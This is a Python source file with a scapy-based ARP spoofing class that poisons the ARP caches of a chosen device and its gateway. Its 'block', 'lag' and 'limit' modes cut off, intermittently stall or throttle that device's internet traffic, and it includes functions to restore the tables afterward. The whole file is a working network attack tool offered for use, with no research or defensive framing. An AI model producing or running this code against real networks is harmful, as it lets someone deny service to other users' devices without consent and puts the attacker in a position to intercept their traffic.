import random
import threading
import time

from scapy.all import ARP, Ether, conf, sendp


class ARPSpoofer:
    """
    Three modes per target device:

    block  — continuous ARP poison, complete internet cutoff.
    lag    — pulses poison/restore to simulate a lag switch.
             intensity (1-100): higher = longer block bursts = more lag.
    limit  — randomly poisons to simulate packet loss / bandwidth cap.
             intensity (1-100): percentage of cycles that are poisoned.
    """

    def __init__(self, iface: str | None = None):
        self._state: dict[str, dict] = {}   # ip -> {running, mode, intensity}
        self._lock  = threading.Lock()
        self._iface = iface or conf.route.route("0.0.0.0")[0]

    # ── public API ────────────────────────────────────────────────────────────

    def apply(self, target_ip: str, target_mac: str,
              gateway_ip: str, gateway_mac: str,
              mode: str = "block", intensity: int = 60) -> None:
        """Start or update the effect on a target."""
        self._stop(target_ip)

        with self._lock:
            self._state[target_ip] = {"running": True,
                                       "mode": mode,
                                       "intensity": intensity}

        threading.Thread(
            target=self._loop,
            args=(target_ip, target_mac, gateway_ip, gateway_mac),
            daemon=True,
        ).start()

    def remove(self, target_ip: str, target_mac: str,
               gateway_ip: str, gateway_mac: str) -> None:
        """Stop effect and restore ARP tables."""
        self._stop(target_ip)
        threading.Thread(
            target=self._restore,
            args=(target_ip, target_mac, gateway_ip, gateway_mac),
            daemon=True,
        ).start()

    def remove_all(self, devices: list[dict],
                   gateway_ip: str, gateway_mac: str) -> None:
        with self._lock:
            active = [ip for ip, s in self._state.items() if s["running"]]
            for ip in active:
                self._state[ip]["running"] = False
        for dev in devices:
            if dev["ip"] in active:
                self._restore(dev["ip"], dev["mac"], gateway_ip, gateway_mac)

    def get_mode(self, target_ip: str) -> str:
        """Returns current mode or 'normal' if not active."""
        s = self._state.get(target_ip)
        return s["mode"] if s and s["running"] else "normal"

    def is_active(self, target_ip: str) -> bool:
        s = self._state.get(target_ip)
        return bool(s and s["running"])

    # ── internal loop ─────────────────────────────────────────────────────────

    def _loop(self, target_ip: str, target_mac: str,
              gateway_ip: str, gateway_mac: str) -> None:
        while True:
            with self._lock:
                s = self._state.get(target_ip, {})
                if not s.get("running"):
                    break
                mode      = s["mode"]
                intensity = s["intensity"]

            if mode == "block":
                self._poison(target_ip, target_mac, gateway_ip, gateway_mac)
                time.sleep(1.5)

            elif mode == "lag":
                # block_time scales 0.2s→3s, allow_time scales 0.4s→0.05s
                block_t = 0.2 + (intensity / 100) * 2.8
                allow_t = 0.4 - (intensity / 100) * 0.35

                for _ in range(3):
                    self._poison(target_ip, target_mac, gateway_ip, gateway_mac)
                time.sleep(block_t)

                with self._lock:
                    if not self._state.get(target_ip, {}).get("running"):
                        break

                self._restore(target_ip, target_mac, gateway_ip, gateway_mac,
                              count=2, inter=0)
                time.sleep(allow_t)

            elif mode == "limit":
                # Poison `intensity`% of cycles → packet loss
                if random.randint(1, 100) <= intensity:
                    self._poison(target_ip, target_mac, gateway_ip, gateway_mac)
                else:
                    self._restore(target_ip, target_mac, gateway_ip, gateway_mac)
                time.sleep(0.25)

    # ── helpers ───────────────────────────────────────────────────────────────

    def _stop(self, target_ip: str) -> None:
        with self._lock:
            if target_ip in self._state:
                self._state[target_ip]["running"] = False

    def _poison(self, target_ip: str, target_mac: str,
                gateway_ip: str, gateway_mac: str) -> None:
        ok1 = self._send(target_mac,
                         ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip))
        ok2 = self._send(gateway_mac,
                         ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
        if not ok1 or not ok2:
            with self._lock:
                if target_ip in self._state:
                    self._state[target_ip]["running"] = False

    def _restore(self, target_ip: str, target_mac: str,
                 gateway_ip: str, gateway_mac: str,
                 count: int = 10, inter: float = 0.05) -> None:
        if not (target_mac and gateway_mac):
            return
        # Ethernet src must match ARP hwsrc or modern devices reject the packet.
        try:
            sendp(
                Ether(src=gateway_mac, dst=target_mac) /
                ARP(op=2, pdst=target_ip, hwdst=target_mac,
                    psrc=gateway_ip, hwsrc=gateway_mac),
                iface=self._iface, verbose=0, count=count, inter=inter,
            )
            sendp(
                Ether(src=target_mac, dst=gateway_mac) /
                ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                    psrc=target_ip, hwsrc=target_mac),
                iface=self._iface, verbose=0, count=count, inter=inter,
            )
        except Exception as e:
            print(f"[spoofer] RESTORE FAILED: {e}")

    def _send(self, dst_mac: str, arp_pkt,
              count: int = 1) -> bool:
        try:
            sendp(Ether(dst=dst_mac) / arp_pkt,
                  iface=self._iface, verbose=0, count=count)
            return True
        except Exception as e:
            print(f"[spoofer] SEND FAILED: {e}")
            print(f"[spoofer] Make sure you are running as Administrator and Npcap is installed.")
            return False
